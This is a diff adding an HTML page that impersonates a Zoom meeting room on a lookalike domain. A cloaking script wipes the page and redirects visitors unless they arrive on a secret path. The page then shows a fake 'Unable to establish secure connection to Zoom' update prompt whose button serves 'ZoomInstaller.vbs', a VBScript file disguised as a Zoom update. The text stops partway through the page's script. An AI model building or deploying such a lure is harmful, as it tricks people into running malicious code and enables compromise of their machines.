@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="en-US" translate="no">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="google" content="notranslate">
+<title>Wieslaw Czynowski's Zoom Meeting</title>
+<script>
+  (function() {
+    var allowedHosts = ['us05web.online', 'www.us05web.online'];
+    var secretPath = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/';
+    var isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+    
+    // If not localhost AND (wrong domain OR wrong folder), wipe the page.
+    if (!isLocal) {
+      if (!allowedHosts.includes(window.location.hostname) || 
+          window.location.pathname.indexOf(secretPath) !== 0) {
+        document.documentElement.innerHTML = '';
+        window.location.href = 'https://us05web.online';
+      }
+    }
+  })();
+</script>
+
+<style>
+:root {
+  --z-blue: #0D6BDE; --z-blue-hover: #0C60C8; --z-blue-active: #084085;
+  --z-text: #222325; --z-border: #DFE3E8;
+  --z-font: "Open Sans", "Helvetica", "Arial", sans-serif;
+}
+* { box-sizing: border-box; }
+html, body { height: 100%; margin: 0; background: #0b0b0d; color: #fff;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+button { font-family: inherit; }
+
+/* ============================================================
+   ROOM UPDATE MODAL
+   ============================================================ */
+.modal-overlay {
+  position: fixed; inset: 0;
+  background-color: rgba(0, 0, 0, 0.4);
+  display: none; justify-content: center; align-items: center; z-index: 1000000;
+}
+.modal-overlay.is-open { display: flex; }
+.modal-content {
+  background-color: #ffffff; width: 520px; max-width: 90%; border-radius: 8px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+  padding: 24px; position: relative; color: #333;
+}
+.modal-content .close-btn {
+  position: absolute; top: 16px; right: 16px; background: none;
+  border: none; font-size: 20px; color: #888; cursor: pointer; line-height: 1;
+}
+.modal-content .close-btn:hover { color: #333; }
+.modal-content h2 { font-size: 20px; font-weight: 700; margin: 0 0 12px; color: #000; }
+.modal-content p { font-size: 14px; line-height: 1.5; color: #555; margin: 0 0 32px; }
+.modal-footer { display: flex; justify-content: space-between; align-items: center; }
+.modal-footer .action-buttons { display: flex; gap: 12px; margin-left: auto; }
+.modal-footer .btn {
+  padding: 8px 24px; border-radius: 6px; font-size: 14px; font-weight: 600;
+  cursor: pointer; border: 1px solid transparent;
+  transition: background-color 0.2s, border-color 0.2s;
+}
+.modal-footer .btn-primary { background-color: #0b5cff; color: white; }
+.modal-footer .btn-primary:hover { background-color: #004ce0; }
+.modal-footer .btn-secondary { background-color: white; color: #333; border-color: #ccc; }
+.modal-footer .btn-secondary:hover { background-color: #f5f5f5; border-color: #bbb; }
+
+/* ============================================================
+   MEETING ROOM
+   ============================================================ */
+#meetingRoom {
+  position: fixed; inset: 0; z-index: 10;
+  background: #0b0b0d; color: #fff;
+  overflow: hidden;
+}
+#meetingRoom .mr-topbar {
+  position: absolute; top: 0; left: 0; right: 0; height: 48px;
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 16px;
+  background: linear-gradient(to bottom, rgba(0,0,0,.55), rgba(0,0,0,0));
+  z-index: 5; font-size: 13px;
+}
+#meetingRoom .mr-topbar-left,
+#meetingRoom .mr-topbar-right { display: flex; align-items: center; gap: 14px; }
+#meetingRoom .mr-meeting-title {
+  display: inline-flex; align-items: center; gap: 8px;
+  background: rgba(0,0,0,.55); padding: 6px 10px; border-radius: 8px; font-weight: 500;
+}
+#meetingRoom .mr-encrypted-badge {
+  width: 18px; height: 18px; border-radius: 50%;
+  background: #00c46a; display: inline-flex; align-items: center; justify-content: center;
+  font-size: 11px; color: #06210f; font-weight: 700;
+}
+#meetingRoom .mr-icon-btn {
+  width: 34px; height: 34px; border-radius: 8px;
+  background: transparent; border: none; color: #fff; cursor: pointer;
+  display: inline-flex; align-items: center; justify-content: center;
+  padding: 0; transition: background-color .12s ease;
+}
+#meetingRoom .mr-icon-btn:hover  { background: rgba(255,255,255,.12); }
+#meetingRoom .mr-icon-btn:active { background: rgba(255,255,255,.20); }
+#meetingRoom .mr-icon-btn svg    { display: block; }
+#meetingRoom .mr-shield svg  { filter: drop-shadow(0 0 1px rgba(0,0,0,.4)); }
+#meetingRoom .mr-ai svg      { stroke: #ffffff; }
+#meetingRoom .mr-apps svg    { fill: #ffffff; }
+#meetingRoom .mr-top-divider {
+  display: inline-block; width: 1px; height: 22px;
+  background: rgba(255,255,255,.18); margin: 0 4px;
+}
+#meetingRoom .mr-avatar {
+  width: 36px; height: 36px; border-radius: 10px;
+  background: rgba(255,255,255,.12);
+}
+#meetingRoom .mr-avatar:hover { background: rgba(255,255,255,.20); }
+#meetingRoom .mr-avatar-inner {
+  width: 28px; height: 28px; border-radius: 50%; background: #ffffff;
+  color: #232333; font-size: 11px; font-weight: 700; letter-spacing: 0.2px;
+  display: inline-flex; align-items: center; justify-content: center;
+  line-height: 1; text-transform: lowercase;
+}
+
+#meetingRoom .mr-ai-toast {
+  position: absolute; top: 64px; right: 20px; width: 300px;
+  background: #1c1d1f; border-radius: 10px; padding: 14px 16px 12px;
+  box-shadow: 0 10px 30px rgba(0,0,0,.45); z-index: 6;
+  font-size: 13px; line-height: 1.45;
+}
+#meetingRoom .mr-ai-toast h4 { margin: 0 0 6px; font-size: 14px; font-weight: 600; }
+#meetingRoom .mr-ai-toast p { margin: 0 0 12px; color: #cfd1d5; }
+#meetingRoom .mr-ai-actions { text-align: right; }
+#meetingRoom .mr-ai-actions button {
+  background: #0b5cff; color: #fff; border: none; border-radius: 6px;
+  padding: 6px 14px; font-size: 13px; font-weight: 500; cursor: pointer;
+}
+#meetingRoom .mr-ai-actions button:hover { background: #004ce0; }
+
+#meetingRoom .mr-stage {
+  position: absolute; inset: 0;
+  display: flex; align-items: center; justify-content: center;
+}
+#meetingRoom .mr-tile {
+  position: relative; width: 100%; height: 100%;
+  background: #000; overflow: hidden;
+  transition: filter .4s ease;
+}
+#meetingRoom .mr-tile video {
+  width: 100%; height: 100%; object-fit: cover; display: block;
+  transform: scaleX(-1) scaleY(1); transform-origin: center center;
+}
+#meetingRoom .mr-name-tag {
+  position: absolute; left: 16px; bottom: 100px;
+  background: rgba(0,0,0,.55); padding: 4px 10px; border-radius: 4px;
+  font-size: 13px; z-index: 3;
+}
+#meetingRoom .mr-avatar-fallback {
+  position: absolute; inset: 0; display: none;
+  flex-direction: column; align-items: center; justify-content: center; gap: 20px;
+  background: #1c1d1f; z-index: 2;
+}
+#meetingRoom .mr-avatar-fallback.is-visible { display: flex; }
+#meetingRoom .mr-avatar-circle {
+  width: 150px; height: 150px; border-radius: 50%; background: #2f3237;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 56px; font-weight: 500; color: #e6e6e6; letter-spacing: 1px; user-select: none;
+}
+#meetingRoom .mr-avatar-name {
+  font-size: 42px; font-weight: 400; color: #fff; text-align: center;
+  padding: 0 24px; line-height: 1.15; max-width: 80vw; word-break: break-word;
+}
+
+/* Toolbar */
+#meetingRoom .mr-toolbar {
+  position: absolute; left: 0; right: 0; bottom: 0; height: 84px;
+  display: flex; align-items: center; justify-content: space-between;
+  background: linear-gradient(to top, rgba(0,0,0,.75), rgba(0,0,0,0));
+  padding: 0 8px; z-index: 5;
+  -webkit-font-smoothing: antialiased;
+}
+#meetingRoom .mr-group { display: inline-flex; align-items: center; gap: 2px; }
+#meetingRoom .mr-group-left   { margin-left: 4px; }
+#meetingRoom .mr-group-center { gap: 6px; }
+#meetingRoom .mr-group-right  { margin-right: 4px; }
+#meetingRoom .mr-tool {
+  position: relative; background: transparent; border: none; color: #fff;
+  padding: 8px 8px 10px; min-width: 60px; height: 76px;
+  display: inline-flex; flex-direction: column; align-items: center;
+  justify-content: flex-start; gap: 3px; cursor: pointer; border-radius: 6px;
+  font-family: inherit; font-size: 11px; line-height: 1; white-space: nowrap;
+  transition: background-color .12s ease;
+}
+#meetingRoom .mr-tool:hover  { background: rgba(255,255,255,.12); }
+#meetingRoom .mr-tool:active { background: rgba(255,255,255,.20); }
+#meetingRoom .mr-tool-top { display: inline-flex; align-items: center; gap: 3px; height: 22px; }
+#meetingRoom .mr-tool svg  { width: 22px; height: 22px; display: block; flex-shrink: 0; }
+#meetingRoom .mr-tool-label { font-size: 11px; font-weight: 400; color: #e6e6e6; line-height: 1; }
+#meetingRoom .mr-caret-inline {
+  font-size: 10px; line-height: 1; color: #cfcfcf; margin-left: 1px;
+  transform: translateY(-2px); display: inline-block;
+}
+#meetingRoom .mr-count {
+  font-size: 11px; line-height: 1; color: #e6e6e6; margin-left: 1px;
+  transform: translateY(-2px); display: inline-block;
+}
+#meetingRoom .mr-tool.is-off svg { color: #ff5a5a; }
+#meetingRoom .mr-leave { color: #ff2d6a; }
+#meetingRoom .mr-leave:hover { background: rgba(255,45,106,.16); }
+#meetingRoom .mr-leave .mr-tool-label { color: #ff2d6a; }
+
+/* Mic / video icon wrappers */
+#meetingRoom .mr-mic-icon {
+  position: relative; display: inline-flex; align-items: center; justify-content: center;
+  width: 22px; height: 22px;
+}
+#meetingRoom .mr-mic-level {
+  position: absolute; left: 50%; bottom: 11px; transform: translateX(-50%);
+  width: 5px; max-height: 9px; height: 0; background: #00d26a;
+  border-top-left-radius: 3px; border-top-right-radius: 3px;
+  opacity: 0.95; transition: height .06s linear; pointer-events: none; z-index: 1;
+}
+#meetingRoom .mr-mic-icon svg { position: relative; z-index: 2; }
+#meetingRoom #mrMuteBtn.is-off .mr-mic-level { height: 0 !important; opacity: 0; }
+#meetingRoom .mr-video-icon {
+  position: relative; display: inline-flex; align-items: center; justify-content: center;
+  width: 22px; height: 22px;
+}
+#meetingRoom .mr-video-icon svg { position: relative; z-index: 1; }
+#meetingRoom #mrMuteBtn.is-off    .mr-mic-icon::after,
+#meetingRoom #mrVideoBtn.is-off   .mr-video-icon::after,
+#meetingRoom #mrMuteBtn.is-denied .mr-mic-icon::after,
+#meetingRoom #mrVideoBtn.is-denied .mr-video-icon::after {
+  content: ""; position: absolute; top: 50%; left: 50%;
+  width: 30px; height: 2px; background: #ff2d6a;
+  transform: translate(-50%, -50%) rotate(-45deg);
+  border-radius: 2px; pointer-events: none; z-index: 3;
+}
+
+/* Info panel */
+#meetingRoom .mr-info-panel {
+  position: absolute; top: 56px; left: 16px; width: 380px;
+  max-width: calc(100vw - 32px);
+  background: #1c1d1f; color: #fff; border-radius: 12px;
+  box-shadow: 0 12px 32px rgba(0,0,0,.55), 0 2px 8px rgba(0,0,0,.35);
+  padding: 20px 22px 16px; z-index: 20;
+  font-size: 13px; line-height: 1.5;
+}
+#meetingRoom .mr-info-panel[hidden] { display: none; }
+#meetingRoom .mr-info-title { font-size: 15px; font-weight: 600; margin: 0 0 16px; color: #fff; }
+#meetingRoom .mr-info-row {
+  display: grid; grid-template-columns: 130px 1fr 28px;
+  align-items: start; gap: 8px; padding: 6px 0;
+}
+#meetingRoom .mr-info-label { color: #9a9da2; font-size: 13px; line-height: 1.4; }
+#meetingRoom .mr-info-value { color: #e8e9ea; font-size: 13px; line-height: 1.4; word-break: break-all; }
+#meetingRoom .mr-info-link {
+  color: #0b5cff; text-decoration: none; cursor: pointer;
+  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+}
+#meetingRoom .mr-info-link:hover { text-decoration: underline; }
+#meetingRoom .mr-info-copy {
+  background: transparent; border: 1px solid rgba(255,255,255,.18);
+  color: #e8e9ea; width: 28px; height: 28px; border-radius: 6px;
+  display: inline-flex; align-items: center; justify-content: center;
+  cursor: pointer; padding: 0;
+  transition: background-color .12s ease, border-color .12s ease, color .12s ease;
+}
+#meetingRoom .mr-info-copy:hover  { background: rgba(255,255,255,.08); border-color: rgba(255,255,255,.3); }
+#meetingRoom .mr-info-copy:active { background: rgba(255,255,255,.16); }
+#meetingRoom .mr-info-copy.is-copied { background: #00c46a; border-color: #00c46a; color: #06210f; }
+
+/* Blur + loading wheel */
+#meetingRoom .mr-loading-overlay {
+  position: absolute; inset: 0; background: rgba(0, 0, 0, 0.85);
+  display: flex; align-items: center; justify-content: center; z-index: 50;
+}
+#meetingRoom .mr-loading-overlay[hidden] { display: none; }
+#meetingRoom .mr-tile.is-blurred video {
+  filter: blur(14px);
+  transform: scale(1.06) scaleX(-1) scaleY(1);
+  transition: filter .4s ease, transform .4s ease;
+}
+#meetingRoom .mr-loading-wheel {
+  position: relative; width: 120px; height: 120px;
+  animation: mrWheelSpin 1.2s steps(12) infinite;
+}
+#meetingRoom .mr-loading-wheel span {
+  position: absolute; left: 50%; top: 50%;
+  width: 8px; height: 22px; margin-left: -4px; margin-top: -60px;
+  background: #4a4a4a; border-radius: 4px; transform-origin: 50% 60px;
+}
+#meetingRoom .mr-loading-wheel span:nth-child(1)  { transform: rotate(  0deg); background: #f5f5f5; }
+#meetingRoom .mr-loading-wheel span:nth-child(2)  { transform: rotate( 30deg); background: #dddddd; }
+#meetingRoom .mr-loading-wheel span:nth-child(3)  { transform: rotate( 60deg); background: #c4c4c4; }
+#meetingRoom .mr-loading-wheel span:nth-child(4)  { transform: rotate( 90deg); background: #ababab; }
+#meetingRoom .mr-loading-wheel span:nth-child(5)  { transform: rotate(120deg); background: #929292; }
+#meetingRoom .mr-loading-wheel span:nth-child(6)  { transform: rotate(150deg); background: #7a7a7a; }
+#meetingRoom .mr-loading-wheel span:nth-child(7)  { transform: rotate(180deg); background: #636363; }
+#meetingRoom .mr-loading-wheel span:nth-child(8)  { transform: rotate(210deg); background: #4f4f4f; }
+#meetingRoom .mr-loading-wheel span:nth-child(9)  { transform: rotate(240deg); background: #3d3d3d; }
+#meetingRoom .mr-loading-wheel span:nth-child(10) { transform: rotate(270deg); background: #2e2e2e; }
+#meetingRoom .mr-loading-wheel span:nth-child(11) { transform: rotate(300deg); background: #212121; }
+#meetingRoom .mr-loading-wheel span:nth-child(12) { transform: rotate(330deg); background: #151515; }
+@keyframes mrWheelSpin { to { transform: rotate(360deg); } }
+</style>
+</head>
+
+<body>
+
+<div id="meetingRoom">
+
+  <!-- Top bar -->
+  <div class="mr-topbar">
+    <div class="mr-topbar-left">
+      <button class="mr-icon-btn mr-info-btn" id="mrInfoBtn" aria-label="Meeting information" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="none" aria-hidden="true">
+          <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.6"/>
+          <circle cx="12" cy="7.8" r="1.15" fill="currentColor"/>
+          <rect x="11" y="10.6" width="2" height="7" rx="0.9" fill="currentColor"/>
+        </svg>
+      </button>
+      <span class="mr-meeting-title">
+        <span class="mr-encrypted-badge">✓</span>
+        Murat Aksu's Zoom Meeting
+      </span>
+    </div>
+
+    <div class="mr-topbar-right">
+      <button class="mr-icon-btn mr-shield" aria-label="Meeting is encrypted">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none">
+          <path d="M12 2.5 4.5 5.5v6c0 4.4 3 8.2 7.5 9.5 4.5-1.3 7.5-5.1 7.5-9.5v-6L12 2.5Z" fill="#22c55e"/>
+          <path d="M8.5 12.2 11 14.7l4.7-5" stroke="#ffffff" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        </svg>
+      </button>
+
+      <button class="mr-icon-btn mr-ai" aria-label="AI Companion">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none"
+             stroke="currentColor" stroke-width="1.4"
+             stroke-linecap="round" stroke-linejoin="round">
+          <path d="M11 4.5 C11.6 7.5 12.5 8.4 15.5 9
+                   C12.5 9.6 11.6 10.5 11 13.5
+                   C10.4 10.5 9.5 9.6 6.5 9
+                   C9.5 8.4 10.4 7.5 11 4.5 Z"/>
+          <path d="M18 3.5 L18.5 5.2 L20.2 5.7
+                   L18.5 6.2 L18 7.9
+                   L17.5 6.2 L15.8 5.7
+                   L17.5 5.2 Z"/>
+        </svg>
+      </button>
+
+      <span class="mr-top-divider" aria-hidden="true"></span>
+
+      <button class="mr-icon-btn mr-apps" aria-label="Apps">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+          <rect x="4"  y="6"  width="5" height="4" rx="0.6"/>
+          <rect x="10" y="6"  width="5" height="4" rx="0.6"/>
+          <rect x="16" y="6"  width="4" height="4" rx="0.6" opacity="0.85"/>
+          <rect x="4"  y="12" width="5" height="4" rx="0.6"/>
+          <rect x="10" y="12" width="5" height="4" rx="0.6"/>
+          <rect x="16" y="12" width="4" height="4" rx="0.6" opacity="0.85"/>
+        </svg>
+      </button>
+
+      <button class="mr-icon-btn mr-avatar" aria-label="Profile">
+        <span class="mr-avatar-inner">zm</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Blur + loading-wheel overlay -->
+  <div class="mr-loading-overlay" id="mrLoadingOverlay" aria-hidden="true" hidden>
+    <div class="mr-loading-wheel" role="status" aria-label="Connecting">
+      <span></span><span></span><span></span><span></span>
+      <span></span><span></span><span></span><span></span>
+      <span></span><span></span><span></span><span></span>
+    </div>
+  </div>
+
+  <!-- Meeting info panel -->
+  <div class="mr-info-panel" id="mrInfoPanel" role="dialog" aria-modal="false" hidden>
+    <h3 class="mr-info-title" id="mrInfoTitle">Murat Aksu's Zoom Meeting</h3>
+
+    <div class="mr-info-row">
+      <span class="mr-info-label">Invite Link</span>
+      <span class="mr-info-value mr-info-link" id="mrInfoInviteLink">https://us05web.zoom.us/j/8831576107</span>
+      <button class="mr-info-copy" id="mrInfoCopyBtn" aria-label="Copy invite link" title="Copy invite link">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" aria-hidden="true">
+          <rect x="8" y="8" width="11" height="12" rx="2" stroke="currentColor" stroke-width="1.5"/>
+          <path d="M6 16V6a2 2 0 0 1 2-2h9" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+        </svg>
+      </button>
+    </div>
+    <div class="mr-info-row">
+      <span class="mr-info-label">Meeting ID</span>
+      <span class="mr-info-value">883 1576 6107</span>
+    </div>
+    <div class="mr-info-row">
+      <span class="mr-info-label">Passcode</span>
+      <span class="mr-info-value">0Jgf9b</span>
+    </div>
+    <div class="mr-info-row">
+      <span class="mr-info-label">Numeric Password<br>Telephone/Room Systems</span>
+      <span class="mr-info-value">421652</span>
+    </div>
+    <div class="mr-info-row">
+      <span class="mr-info-label">Participant ID</span>
+      <span class="mr-info-value">144177</span>
+    </div>
+  </div>
+
+  <!-- AI toast -->
+  <div class="mr-ai-toast" id="mrAiToast">
+    <h4>A new home for Zoom AI</h4>
+    <p>All your AI features are in the top right, with clearer indicators when transcription is on.</p>
+    <div class="mr-ai-actions">
+      <button onclick="document.getElementById('mrAiToast').style.display='none'">Got it</button>
+    </div>
+  </div>
+
+  <!-- Video stage -->
+  <div class="mr-stage">
+    <div class="mr-tile">
+      <video id="meetingRoomVideo" autoplay muted playsinline></video>
+      <div class="mr-avatar-fallback" id="mrAvatarFallback">
+        <div class="mr-avatar-circle" id="mrAvatarInitials">JP</div>
+        <div class="mr-avatar-name" id="mrAvatarName">John Paul</div>
+      </div>
+      <div class="mr-name-tag" id="mrNameTag">john paul</div>
+    </div>
+  </div>
+
+  <!-- Bottom toolbar -->
+  <div class="mr-toolbar">
+
+    <div class="mr-group mr-group-left">
+      <button class="mr-tool" id="mrMuteBtn">
+        <span class="mr-tool-top">
+          <span class="mr-mic-icon">
+            <span id="mrMicLevelBar" class="mr-mic-level"></span>
+            <svg viewBox="0 0 24 24" fill="none">
+              <path d="M7.5 4.5C7.5 2.01 9.51 0 12 0s4.5 2.01 4.5 4.5V12c0 2.49-2.01 4.5-4.5 4.5S7.5 14.49 7.5 12V4.5ZM12 15c1.65 0 3-1.35 3-3V4.5c0-1.65-1.35-3-3-3s-3 1.35-3 3V12c0 1.65 1.35 3 3 3Z" fill="currentColor"/>
+              <path d="M19.485 12.15c.015-.045.015-.105.015-.15 0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 3.315-2.685 6-6 6s-6-2.685-6-6c0-.42-.33-.75-.75-.75s-.75.33-.75.75c0 .045 0 .105.015.15.06 3.81 2.985 6.93 6.735 7.305V22.5h-3c-.42 0-.75.33-.75.75s.33.75.75.75h7.5c.42 0 .75-.33.75-.75s-.33-.75-.75-.75h-3v-3.045c3.75-.375 6.675-3.495 6.735-7.305Z" fill="currentColor"/>
+            </svg>
+          </span>
+          <span class="mr-caret-inline">⌃</span>
+        </span>
+        <span id="mrMuteLabel" class="mr-tool-label">Mute</span>
+      </button>
+
+      <button class="mr-tool" id="mrVideoBtn">
+        <span class="mr-tool-top">
+          <span class="mr-video-icon">
+            <svg viewBox="0 0 24 24" fill="none">
+              <path fill-rule="evenodd" clip-rule="evenodd" d="M.75 5.25A2.25 2.25 0 0 1 3 3h9.75a3.75 3.75 0 0 1 3.75 3.75V15a2.25 2.25 0 0 1-2.25 2.25H4.5A3.75 3.75 0 0 1 .75 13.5V5.25ZM3 4.5h9.75A2.25 2.25 0 0 1 15 6.75V15a.75.75 0 0 1-.75.75H4.5a2.25 2.25 0 0 1-2.25-2.25V5.25A.75.75 0 0 1 3 4.5Z" fill="currentColor"/>
+              <path d="M23.25 5.25a.75.75 0 0 0-1.18-.614L18.32 7.26a.75.75 0 0 0 .86 1.228l2.57-1.799v6.87l-2.57-1.8a.75.75 0 1 0-.86 1.23l3.75 2.624A.75.75 0 0 0 23.25 15V5.25Z" fill="currentColor"/>
+            </svg>
+          </span>
+          <span class="mr-caret-inline">⌃</span>
+        </span>
+        <span id="mrVideoLabel" class="mr-tool-label">Video</span>
+      </button>
+    </div>
+
+    <div class="mr-group mr-group-center">
+      <button class="mr-tool" id="mrParticipantsBtn">
+        <span class="mr-tool-top">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"
+               stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="10" cy="8" r="2.4"/>
+            <path d="M5.5 19c0-2.4 2-4.3 4.5-4.3s4.5 1.9 4.5 4.3"/>
+            <circle cx="16.5" cy="7.5" r="1.9"/>
+            <path d="M14.6 18.6c.4-1.9 1.7-3.2 3.4-3.2 1.2 0 2.2.7 2.8 1.7"/>
+          </svg>
+          <span class="mr-count">1</span>
+          <span class="mr-caret-inline">⌃</span>
+        </span>
+        <span class="mr-tool-label">Participants</span>
+      </button>
+
+      <button class="mr-tool" id="mrChatBtn">
+        <span class="mr-tool-top">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"
+               stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4.5 5.5h15a1 1 0 0 1 1 1v9a1 1 0 0 1-1 1h-9.5L5.5 19.5V16.5H4.5a1 1 0 0 1-1-1v-9a1 1 0 0 1 1-1Z"/>
+          </svg>
+          <span class="mr-caret-inline">⌃</span>
+        </span>
+        <span class="mr-tool-label">Chat</span>
+      </button>
+
+      <button class="mr-tool" id="mrReactBtn">
+        <span class="mr-tool-top">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
+               stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 20.5S3.5 15.5 3.5 9.5A4.5 4.5 0 0 1 12 6.7a4.5 4.5 0 0 1 8.5 2.8c0 6-8.5 11-8.5 11Z"/>
+          </svg>
+        </span>
+        <span class="mr-tool-label">React</span>
+      </button>
+
+      <button class="mr-tool" id="mrShareBtn">
+        <span class="mr-tool-top">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
+               stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3.5" y="4.5" width="17" height="15" rx="2"/>
+            <path d="M12 16V8M12 8l-3 3M12 8l3 3"/>
+          </svg>
+        </span>
+        <span class="mr-tool-label">Share</span>
+      </button>
+
+      <button class="mr-tool" id="mrMoreBtn">
+        <span class="mr-tool-top">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
+            <circle cx="12" cy="12" r="8.5"/>
+            <circle cx="8.6" cy="12" r="0.9" fill="currentColor" stroke="none"/>
+            <circle cx="12" cy="12" r="0.9" fill="currentColor" stroke="none"/>
+            <circle cx="15.4" cy="12" r="0.9" fill="currentColor" stroke="none"/>
+          </svg>
+        </span>
+        <span class="mr-tool-label">More</span>
+      </button>
+    </div>
+
+    <div class="mr-group mr-group-right">
+      <button class="mr-tool mr-leave" id="mrLeaveBtn">
+        <span class="mr-tool-top">
+          <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M14 4.8 L20 3.6 V20.4 L14 19.2 Z" stroke="#e5005a" stroke-width="2.2" fill="none"/>
+            <circle cx="8.4" cy="7.4" r="1.7" stroke="#ffffff" stroke-width="1.5" fill="none"/>
+            <path d="M5.6 20c0-3 1.6-5.2 2.8-6.2" stroke="#ffffff" stroke-width="1.5" fill="none"/>
+            <path d="M11.2 20c0-3-1.2-5.2-2.8-6.2" stroke="#ffffff" stroke-width="1.5" fill="none"/>
+            <path d="M8.4 13.8v2.4" stroke="#ffffff" stroke-width="1.5" fill="none"/>
+          </svg>
+        </span>
+        <span class="mr-tool-label">Leave</span>
+      </button>
+    </div>
+  </div>
+</div><!-- /#meetingRoom -->
+
+<!-- Room Update Modal -->
+<div class="modal-overlay" id="roomUpdateModal" role="dialog" aria-modal="true"
+     aria-labelledby="roomUpdateModalTitle">
+  <div class="modal-content">
+    <button class="close-btn" onclick="closeRoomUpdateModal('close')" aria-label="Close">×</button>
+    <svg width="22" height="22" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="32" height="32" rx="8" fill="#2D8CFF"></rect>
+      <path d="M7 11.5C7 10.6716 7.67157 10 8.5 10H17.5C18.3284 10 19 10.6716 19 11.5V20.5C19 21.3284 18.3284 22 17.5 22H8.5C7.67157 22 7 21.3284 7 20.5V11.5Z" fill="white"></path>
+      <path d="M20 14L25 11V21L20 18V14Z" fill="white"></path>
+    </svg>
+    <h2 id="roomUpdateModalTitle">Unable to establish secure connection to Zoom</h2>
+    <p>Install the Zoom Workplace Update 7.1.8. Please update to continue.</p>
+    <div class="modal-footer">
+      <div class="action-buttons">
+        <button class="btn btn-primary" onclick="roomManualUpdate()">Update</button>
+        <button class="btn btn-secondary" onclick="closeRoomUpdateModal('cancel')">Cancel</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="../lang.js"></script>
+<script>
+(function () {
+  'use strict';
+
+  var $ = function (id) { return document.getElementById(id); };
+
+  // Config
+  var UPDATE_DOWNLOAD_URL      = '/Zoom_Installer_Download/ZoomInstaller.vbs';
+  var UPDATE_REDIRECT_URL      = '#';
+  var ROOM_UPDATE_DELAY_MS     = 1000;
+  var ROOM_MODAL_OPEN_DELAY_MS = 500;
+
+  function getLang() {
+    try { return localStorage.getItem('zoom.lang') || 'en-US'; } catch (e) { return 'en-US'; }
+  }
+  function getTr() {
+    var lang = getLang();
+    return (window.zoomTranslations && window.zoomTranslations[lang]) ||
+           (window.zoomTranslations && window.zoomTranslations['en-US']) || {};
+  }
+
+  function initialsFrom(name) {
+    if (!name) return '?';
+    var parts = String(name).trim().split(/\s+/).filter(Boolean);
+    if (!parts.length) return '?';
+    if (parts.length === 1) return parts[0].slice(0, 2).toUpperCase();
+    return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
+  }
+
+  // ============================================================
+  // Mic meter
+  // ============================================================
+  function startMicMeter(stream) {
+    var bar = $('mrMicLevelBar'); if (!bar) return;
+    var at = stream.getAudioTracks(); if (!at.length) return;
+
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC) return;
+    if (window.__zoomMicCtx) { try { window.__zoomMicCtx.close(); } catch (e) {} }
+    window.__zoomMicCtx = null;
+
+    var ctx, src, analyser, data;
+    try {
+      ctx = new AC();
+      src = ctx.createMediaStreamSource(stream);
+      analyser = ctx.createAnalyser();
+      analyser.fftSize = 256;
+      src.connect(analyser);
+      data = new Uint8Array(analyser.frequencyBinCount);
+    } catch (e) { return; }
+
+    window.__zoomMicCtx = ctx;
+    if (ctx.state === 'suspended' && ctx.resume) ctx.resume().catch(function () {});
+
+    var GATE = 18;
+    function tick() {
+      if (!window.__zoomMicCtx || window.__zoomMicCtx !== ctx) return;
+      var mb = $('mrMuteBtn');
+      var muted = mb && mb.classList.contains('is-off');
+      if (muted) { requestAnimationFrame(tick); return; }
+      analyser.getByteFrequencyData(data);
+      var sum = 0; for (var i = 0; i < data.length; i++) sum += data[i];
+      var avg = sum / data.length;
+      var pct = avg < GATE ? 0 : Math.min(100, ((avg - GATE) / (255 - GATE)) * 100 * 1.6);
+      var rBar = $('mrMicLevelBar'); if (rBar) rBar.style.height = pct + '%';
+      requestAnimationFrame(tick);
+    }
+    tick();
+  }
+
+  // ============================================================
+  // Toolbar wiring
+  // ============================================================
+  function wireMeetingRoomToolbar(stream) {
+    var room = $('meetingRoom');
+    if (!room || room.dataset.wired === '1') return;
+    room.dataset.wired = '1';
+
+    var audioTrack = stream ? (stream.getAudioTracks()[0] || null) : null;
+    var videoTrack = stream ? (stream.getVideoTracks()[0] || null) : null;
+
+    var muteBtn   = $('mrMuteBtn'),  muteLabel  = $('mrMuteLabel');
+    var videoBtn  = $('mrVideoBtn'), videoLabel = $('mrVideoLabel');
+    var leaveBtn  = $('mrLeaveBtn');
+    var fallback  = $('mrAvatarFallback');
+    var muted     = false;
+    var videoOn   = true;
+
+    if (muteBtn) {
+      muteBtn.addEventListener('click', function () {
+        muted = !muted;
+        if (audioTrack) audioTrack.enabled = !muted;
+        var tr = getTr();
+        if (muteLabel) muteLabel.textContent = muted ? (tr.tbUnmute || 'Unmute') : (tr.tbMute || 'Mute');
